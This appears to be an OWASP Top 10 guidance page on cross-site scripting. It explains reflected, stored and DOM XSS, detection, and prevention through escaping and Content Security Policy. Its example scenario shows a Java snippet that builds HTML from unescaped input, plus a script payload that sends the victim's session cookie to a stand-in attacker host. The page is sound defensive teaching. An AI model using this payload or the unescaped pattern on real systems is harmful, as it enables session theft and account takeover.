# A7 Cross Site Scripting

| Threat agents/Attack vectors | Security Weakness           | Impacts               |
| -- | -- | -- |
| Access Lvl \| Exploitability | Prevalence \| Detectability | Technical \| Business |
| Automated tools can detect and exploit all three forms of XSS, and there are freely available exploitation frameworks. | XSS is the second most prevalent issue in the OWASP Top 10, and is found in around two thirds of all applications. | The impact of XSS is moderate for reflected and DOM XSS, and severe for stored XSS, with remote code execution on the victim's browser, such as stealing credentials, sessions, or delivering malware to the victim. |

## Am I vulnerable to attack?

Three are three forms of XSS:

* **Reflected XSS**. If your application or API includes unsanitized user input as part of HTML output, and this is not validated or escaped, or there is no content security policy, the victim's browser will execute the attacker's arbitrary HTML or JavaScript content. Typically the user will need to interact with a link, or some other attacker controlled page, such as a watering hole attack such as malvertizing or similar. 
* **Stored XSS** If your application or API stores unsanitized user input, and then this is viewed at a later time by another user or an administrator, the attacker can run arbitrary HTML or JavaScript on the victim user or administrator's browser. As the impact is higher, stored XSS is often considered a high or critical risk. 
* **DOM XSS**. Modern JavaScript frameworks and single page applications and APIs that dynamically include attacker-controllable data to a page, are vulnerable to DOM XSS. Ideally, you would avoid sending attacker-controllable data to unsafe JavaScript APIs, but context aware escaping, input validation and content security policies can reduce the likelihood of all three forms of XSS.

Typical XSS attacks include session stealing, account takeover, MFA bypass, DIV replacement or defacement (such as trojan login DIVs), attacks against the user's browser such as malicious software downloads, key logging, and other client side attacks.

Automated tools can find some XSS problems automatically, particularly in mature technologies such as PHP, J2EE / JSP, and ASP.NET. However, each application builds output pages differently and uses different browser side interpreters such as JavaScript, usually using third party libraries built on top of these technologies. This diversity makes automated detection difficult, particularly when using single-page applications and modern JavaScript frameworks and libraries, particularly if automated tools have not caught up with the new library, or if testers are unfamiliar with DOM XSS.

Development teams seeking to assess if they have cross site scripting should always use the latest frameworks, which typically aim to prevent XSS as a bug class. Deeper verification requires a combination of skilled penetration testing and manual source code review.

Large and high performing organizations should consider the use of automated SAST tools to inspect their source integrated into the CI/CD pipeline, along with automated scripted DAST tools such as OWASP Zap, scanning every build of every application in the portfolio to discover easily discovered flaws with every build. Although not a complete panacea, automated testing has a place in larger organizations where penetration tests after each build or manual source code review is impractical.

## How do I prevent

Preventing XSS requires separation of untrusted data from active browser content.

1. Escaping untrusted HTTP request data based on the context in the HTML output (body, attribute, JavaScript, CSS, or URL) will resolve [Server XSS](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Server_XSS) vulnerabilities. The [OWASP XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) has details on the required data escaping techniques.

2. Applying context sensitive encoding when modifying the browser document on the client side acts against [client XSS](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting#Client_XSS). When this cannot be avoided, similar context sensitive escaping techniques can be applied to browser APIs as described in the [OWASP DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).

3. Enabling a [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)) (CSP) and moving inline javascript code to additional files will defend against XSS across the entire site, assuming no other vulnerabilities (such as upload path tampering or download path traversal) exist that would allow placing malicious code in the server files.

## Example Scenarios

The application uses untrusted data in the construction of the following HTML snippet without validation or escaping:

`(String) page += "<input name='creditcard' type='TEXT' value='" + request.getParameter("CC") + "'>";`

The attacker manipulates the 'CC' parameter in his browser to:

`'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>'`

This attack causes the victim's session ID to be sent to the attacker's website, allowing the attacker to hijack the user's current session. 
Note that attackers can also use XSS to defeat any automated CSRF defense the application might employ. See 2017-A8 for information on CSRF.

## References

### OWASP

* [OWASP Proactive Controls - #3 Encode Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Proactive Controls - #4 Validate Data](https://www.owasp.org/index.php/OWASP_Proactive_Controls#tab=OWASP_Proactive_Controls_2016)
* [OWASP Application Security Verification Standard - V5](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project)
* [OWASP Testing Guide: Testing for Reflected XSS](https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001))
* [OWASP Testing Guide: Testing for Stored XSS](https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002))
* [OWASP Testing Guide: Testing for DOM XSS](https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001))
* [OWASP XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
* [OWASP DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)
* [OWASP XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

### External

* [CWE-79: Improper neutralization of user supplied input](https://cwe.mitre.org/data/definitions/79.html)
* [PortSwigger: Client-side template injection](https://portswigger.net/knowledgebase/issues/details/00200308_clientsidetemplateinjection)
